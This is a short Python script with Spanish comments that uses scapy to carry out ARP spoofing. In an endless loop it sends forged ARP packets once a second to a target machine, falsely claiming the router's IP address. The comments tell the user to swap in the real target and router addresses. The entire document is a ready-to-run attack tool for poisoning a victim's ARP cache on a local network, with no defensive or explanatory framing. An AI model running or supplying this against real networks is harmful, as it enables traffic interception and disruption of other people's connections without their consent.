import scapy.all as scapy
import time

# Definir las direcciones IP del objetivo y del router
objetivo_ip = "192.168.122.10"  # Reemplazar con la IP real del objetivo
router_ip = "192.168.122.1"  # Reemplazar con la IP real del router

# Enviar paquetes ARP falsos al objetivo
while True:
    # Crear un paquete ARP falso que asocia la dirección MAC del atacante a la IP del router
    paquete_arp = scapy.ARP(psrc=router_ip, pdst=objetivo_ip, hwdst=scapy.RandMAC())

    # Enviar el paquete ARP falso al objetivo
    scapy.send(paquete_arp, verbose=False)

    # Esperar un segundo antes de enviar el siguiente paquete
    time.sleep(1)
